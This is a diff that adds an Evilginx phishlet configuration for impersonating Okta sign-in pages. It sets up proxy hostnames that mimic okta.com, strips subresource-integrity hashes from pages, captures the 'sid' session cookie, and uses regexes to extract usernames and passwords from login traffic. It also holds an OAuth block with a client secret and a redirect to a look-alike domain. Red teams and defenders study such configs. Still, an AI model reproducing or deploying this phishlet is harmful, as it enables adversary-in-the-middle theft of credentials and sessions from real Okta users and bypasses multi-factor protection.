@@ -1,0 +1,37 @@
+author: '@mikesiegel'
+min_ver: '3.0.0'
+redirect_url: 'https://example.okta.com/'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'okta.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'EXAMPLE', orig_sub: 'EXAMPLE', domain: 'okta.com', session: true, is_landing: true, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'EXAMPLE.okta.com', orig_sub: '', domain: 'EXAMPLE.okta.com', search: 'sha384-.{64}', replace: '', mimes: ['text/html']}
+auth_tokens:
+  - domain: 'EXAMPLE.okta.com'
+    keys: ['sid:always']
+    type: 'cookie'
+auth_urls:
+  - '/login/login.htm'
+  - '/app/UserHome/'
+credentials:
+  username:
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+login:
+  domain: 'EXAMPLE.okta.com'
+  path: '/login/login.htm'
+oauth2:
+  client_id: 'evilginx-proxy-okta'
+  client_secret: 'd0e1f2a3b4c5678901234567890abcdef1234567890abcdef1234567890abcdef12'
+  redirect_uri: 'https://okta.uploadfile.space'
+  authorization_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/auth'
+  token_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/token'
+  userinfo_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/userinfo'
+  jwks_uri: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/certs'
+  scope: 'openid email profile offline_access evilginx-phishlet'
